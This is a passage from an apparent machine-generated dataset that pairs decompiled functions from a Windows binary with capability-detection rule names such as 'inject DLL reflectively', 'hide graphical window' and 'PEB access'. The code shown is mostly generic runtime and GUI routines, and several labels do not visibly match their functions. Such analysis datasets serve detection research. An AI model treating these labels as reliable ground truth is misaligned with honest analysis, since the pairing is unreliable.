        "decompiled_code": "\nvoid __fastcall fcn.00423e48(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    cVar1 = fcn.004040e4();\n    if (cVar1 == '\\0') {\n        fcn.00403f58();\n        *(in_EAX + 0xc) = 0;\n        iVar2 = (**(param_2 + 0x48))();\n        *(in_EAX + 0xc) = iVar2;\n        *(iVar2 + 0x14) = in_EAX;\n        uVar3 = fcn.0040416c();\n        *(iVar2 + 0x10) = uVar3;\n        *(iVar2 + 0x1c) = in_EAX;\n        uVar3 = fcn.0040416c();\n        *(iVar2 + 0x18) = uVar3;\n        fcn.00404154();\n    }\n    return;\n}\n",
        "token_count": 230
    },
    "00423ec4": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00423ec4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    int32_t *piStack24;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    if (param_2 != 0) {\n        piStack24 = 0x423edf;\n        iVar1 = fcn.00403e30();\n        piStack24 = 0x423ee4;\n        var_4h = (**(iVar1 + 0x48))();\n        piStack24 = 0x423ef1;\n        (**(*var_4h + 8))();\n        var_4h[5] = in_EAX;\n        uStack28 = 0x423f03;\n        piStack24 = var_4h;\n        iVar1 = fcn.0040416c();\n        piStack24[4] = iVar1;\n        var_4h[7] = in_EAX;\n        uStack28 = 0x423f1b;\n        piStack24 = var_4h;\n        iVar1 = fcn.0040416c();\n        piStack24[6] = iVar1;\n    }\n    uStack28 = 0x423f54;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    piStack24 = &stack0xfffffffc;\n    fcn.00403f58();\n    *(in_EAX + 0xc) = var_4h;\n    fcn.00404154();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 386
    },
    "004499e0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004499e0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0040775c(*(param_2 + 0x20), *(param_2 + 0x34), 0, *(param_2 + 0x1c), *(param_2 + 0x18), \n                         *(param_2 + 0x14), *(param_2 + 0x10), *(param_2 + 0xc), *(param_2 + 4));\n    *(in_EAX + 0x1b4) = uVar1;\n    return;\n}\n",
        "token_count": 156
    },
    "00450144": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00450144(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    \n    if ((in_ECX == 0) && (in_ECX = *(*(in_EAX + 100) + 8),  iVar1 = in_ECX,  arg_8h != '\\0')) {\n        do {\n            in_ECX = iVar1;\n            iVar1 = *(in_ECX + 0xc);\n        } while (*(in_ECX + 0xc) != 0);\n    }\n    if (arg_8h == '\\0') {\n        *(in_EDX + 0xc) = in_ECX;\n        iVar1 = *(in_ECX + 0x18);\n        *(in_EDX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0xc) = in_EDX;\n        }\n        *(in_ECX + 0x18) = in_EDX;\n        iVar1 = *(in_ECX + 0x14);\n        *(in_EDX + 0x14) = iVar1;\n        if (in_ECX == *(iVar1 + 8)) {\n            *(iVar1 + 8) = in_EDX;\n        }\n    }\n    else {\n        *(in_EDX + 0x14) = *(in_ECX + 0x14);\n        *(in_EDX + 0x18) = in_ECX;\n        iVar1 = *(in_ECX + 0xc);\n        *(in_EDX + 0xc) = iVar1;\n        if (iVar1 != 0) {\n            *(iVar1 + 0x18) = in_EDX;\n        }\n        *(in_ECX + 0xc) = in_EDX;\n    }\n    fcn.0044f60c();\n    fcn.0044f9a4();\n    return;\n}\n",
        "token_count": 434
    },
    "00478494": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.00478494(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((in_EAX[5] < 0xca) || (0xd2 < in_EAX[5])) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    return *(in_EAX[0x6d] + 0x10);\n}\n",
        "token_count": 125
    },
    "00478578": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478578(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    iVar1 = *in_EAX;\n    *(iVar1 + 0x14) = 0x36;\n    *(iVar1 + 0x18) = param_2;\n    (***in_EAX)();\n    return;\n}\n",
        "token_count": 89
    },
    "004796f8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004796f8(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1b4) = puVar1;\n    *puVar1 = 0x479610;\n    puVar1[1] = 0x4796bc;\n    puVar1[2] = fcn.004795c8;\n    puVar1[3] = 0x479600;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    puVar1[6] = 1;\n    return;\n}\n",
        "token_count": 155
    },
    "00485160": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.00485160(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x158) = puVar1;\n    *puVar1 = 0x484f04;\n    puVar1[1] = 0x484f44;\n    puVar1[2] = 0x48501c;\n    puVar1[3] = 0x4850dc;\n    puVar1[4] = 0x4850e8;\n    puVar1[5] = 0x484ec4;\n    puVar1[6] = 0x484efc;\n    puVar1[7] = 0;\n    return;\n}\n",
        "token_count": 177
    },
    "0041fec4": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.0041fec4(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "00421878": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421878(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00421d68();\n    uVar1 = fcn.00421508();\n    sub.user32.dll_FillRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 109
    },
    "004218b4": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004218b4(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00421d68();\n    uVar1 = fcn.00421508();\n    sub.user32.dll_FrameRect(in_EAX[1], param_2, uVar1);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 109
    },
    "00421a3c": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421a3c(int32_t *param_1)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_1 != NULL) {\n        (**(*in_EAX + 0x10))();\n        fcn.00421d68();\n        (**(*param_1 + 0x14))();\n        (**(*in_EAX + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "00436814": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00436814(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x43683e;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 125
    },
    "00453600": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00453600(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x453692;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x49172c) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.00453390();\n    if (cVar1 == '\\0') {\n        fcn.00406a50();\n        fcn.0040c5ac();\n        fcn.004047cc();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.00453b6c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.00404da0(0x453699);\n    return;\n}\n",
        "token_count": 337
    },
    "0042e1f8": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid fcn.0042e1f8(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x42e20a;\n    cVar2 = (**(*in_EAX + 0x24))();\n    if (cVar2 != '\\0') {\n        piVar1 = in_EAX[10];\n        *(piVar1 + 0x94) = 1;\n        uStack20 = 0x42e24e;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        (**(*piVar1 + 0xdc))();\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX[10] + 0x250) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 235
    },
    "004240a8": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid fcn.004240a8(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xc) != NULL) {\n        (**(**(in_EAX + 0xc) + 0x50))();\n    }\n    return;\n}\n",
        "token_count": 61
    },
    "00447d10": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447d10(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x447dad;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004040e4();\n    if (cVar1 == '\\0') {\n        fcn.004155e8();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.004559ec();\n        fcn.00455b28();\n        fcn.004455ac();\n        fcn.00455884();\n        fcn.00455c48();\n        (**(*param_2 + 0x34))(in_EAX[0x44], in_EAX[0x45]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x447db4;\n    uStack28 = 0x447dac;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 288
    },
    "00453554": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00453554(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (param_2 != 0) {\n        return param_2;\n    }\n    iVar1 = (**(**(in_EAX + 0x50) + 0x68))();\n    return iVar1;\n}\n",
        "token_count": 89
    },
    "00455b28": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00455b28(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.004051b0(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00404108();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.00404df4();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "004633a0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004633a0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.0044d568();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.0044d1c8();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                cVar1 = (**(**(in_EAX + 0x84) + 0xf0))();\n                if (cVar1 == '\\0') {\n                    fcn.004631dc();\n                }\n                else {\n                    uVar2 = fcn.0044d1c8(0);\n                    sub.user32.dll_ShowWindow(uVar2);\n                    fcn.004454cc();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "004039c0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004039c0(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 177
    },
    "00404108": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.00404108(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ddc();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "00404184": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00404184(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 116
    },
    "00404a18": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00404a18(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x4957d0;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4957cc != 0) {\n        iVar1 = *(*0x4957cc + 4);\n        uStack24 = 0x404a61;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x4957d0 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00404a7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00404a7c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*0x4957cc != NULL) {\n        iVar1 = **0x4957cc;\n        iVar4 = 0;\n        iVar2 = (*0x4957cc)[1];\n        uStack28 = 0x404ac9;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x4957d0 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "004058d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.004058d4(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00405840();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405810();\n                iVar4 = iVar3 + -1;\n                bVar2 = 0 < iVar3;\n                iVar3 = iVar4;\n            } while (iVar4 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ddc();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar4 = iVar3 + -1;\n        bVar2 = 0 < iVar3;\n        iVar3 = iVar4;\n    } while (iVar4 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 494
    },
    "00405a18": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n// WARNING: Removing unreachable block (ram,0x0040599a)\n// WARNING: Removing unreachable block (ram,0x00405980)\n\nvoid __fastcall fcn.00405a18(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.00404da0();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00405580();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00405914();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.0040592c();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.004058e0();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00406570();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402ddc();\n            return;\n        }\n        do {\n            fcn.00405e64();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 541
    },
    "00405cbc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00402e08)\n\nvoid __fastcall fcn.00405cbc(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.00404da0();\n            }\n            else {\n                fcn.00404dc4();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405580();\n            }\n            else {\n                fcn.00405598();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00405914();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.0040592c();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.004058e0();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.00406570();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402ddc();\n                return;\n            }\n            do {\n                fcn.00405e64();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 578
    },
    "00405f40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00405f40(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *0x490034;\n    if (*0x490034 != NULL) {\n        do {\n            if (((in_EAX == piVar2[1]) || (in_EAX == piVar2[2])) || (in_EAX == piVar2[3])) {\n                iVar1 = fcn.00405ef8();\n                return iVar1;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX;\n}\n",
        "token_count": 150
    },
    "00405f78": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00405f78(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return in_EAX;\n}\n",
        "token_count": 62
    },
    "004063d4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004063d4(void)\n\n{\n    char cVar1;\n    code *in_EAX;\n    int32_t *piVar2;\n    \n    piVar2 = *0x490034;\n    if (*0x490034 != NULL) {\n        do {\n            fcn.00405ef8();\n            cVar1 = (*in_EAX)();\n            if (cVar1 == '\\0') {\n                return;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "00406430": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406430(void)\n\n{\n    int32_t **ppiVar1;\n    int32_t *in_EAX;\n    int32_t **ppiVar2;\n    \n    if ((*0x490038 == NULL) || ((*0x490038)[1] != in_EAX)) {\n        ppiVar2 = *0x490038;\n        if (*0x490038 != NULL) {\n            do {\n                ppiVar1 = *ppiVar2;\n                if ((ppiVar1 != NULL) && (ppiVar1[1] == in_EAX)) {\n                    *ppiVar2 = *ppiVar1;\n                    fcn.00402d00();\n                    return;\n                }\n                ppiVar2 = *ppiVar2;\n            } while (ppiVar2 != NULL);\n        }\n    }\n    else {\n        *0x490038 = **0x490038;\n        fcn.00402d00();\n    }\n    return;\n}\n",
        "token_count": 205
    },
    "00406500": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406500(void)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint *var_4h;\n    \n    puStack12 = &stack0xfffffffc;\n    uStack16 = 0x406564;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack20;\n    var_4h = in_EAX;\n    fcn.00406494();\n    *in_FS_OFFSET = uStack20;\n    puVar1 = *0x490034;\n    if (var_4h == *0x490034) {\n        *0x490034 = *var_4h;\n    }\n    else {\n        for (; puVar1 != NULL; puVar1 = *puVar1) {\n            if (*puVar1 == var_4h) {\n                *puVar1 = *var_4h;\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 232
    },
    "00408d3c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00408d3c(uint32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar5;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar6;\n    char cVar4;\n    \n    puVar6 = unaff_ESI;\n    if (param_1 == '\\0') {\n        if (in_EAX < 0) {\n            fcn.00408d52();\n            unaff_ESI[-1] = 0x2d;\n            return;\n        }\n        param_1 = 10;\n    }\n    do {\n        uVar2 = in_EAX / param_1;\n        puVar6 = puVar6 + -1;\n        cVar4 = in_EAX % param_1;\n        uVar3 = cVar4 + 0x30;\n        if (0x39 < uVar3) {\n            uVar3 = cVar4 + 0x37;\n        }\n        *puVar6 = uVar3;\n        in_EAX = uVar2;\n    } while (uVar2 != 0);\n    iVar5 = param_2 - (unaff_ESI - puVar6);\n    if (unaff_ESI - puVar6 <= param_2 && iVar5 != 0) {\n        iVar1 = -iVar5;\n        while (iVar5 = iVar5 + -1,  iVar5 != 0) {\n            (puVar6 + iVar1)[iVar5] = 0x30;\n        }\n        puVar6[iVar1] = 0x30;\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "004096e4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004096e4(int32_t param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    bool bVar8;\n    \n    uVar4 = 0;\n    iVar6 = param_1;\n    pcVar7 = param_2;\n    if (param_1 != 0) {\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            cVar2 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar2 != '\\0');\n        param_1 = param_1 - iVar6;\n        bVar8 = true;\ncode_r0x004096fd:\n        do {\n            if (param_1 != 0) {\n                param_1 = param_1 + -1;\n                pcVar1 = param_2 + 1;\n                pcVar7 = in_EAX + 1;\n                bVar8 = *in_EAX == *param_2;\n                in_EAX = pcVar7;\n                param_2 = pcVar1;\n                if (bVar8) goto code_r0x004096fd;\n            }\n            if (bVar8) {\n                return;\n            }\n            uVar3 = in_EAX[-1];\n            uVar5 = uVar4 & 0xffffff00 | uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar5 = uVar4 & 0xffffff00 | uVar3 - 0x20;\n            }\n            uVar3 = param_2[-1];\n            uVar4 = uVar3;\n            if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                uVar4 = uVar3 - 0x20;\n            }\n            uVar4 = uVar5 - uVar4;\n            bVar8 = uVar4 == 0;\n        } while (bVar8);\n    }\n    return;\n}\n",
        "token_count": 501
    },
    "00409728": {
        "rules": [
            "contain loop"
        ],
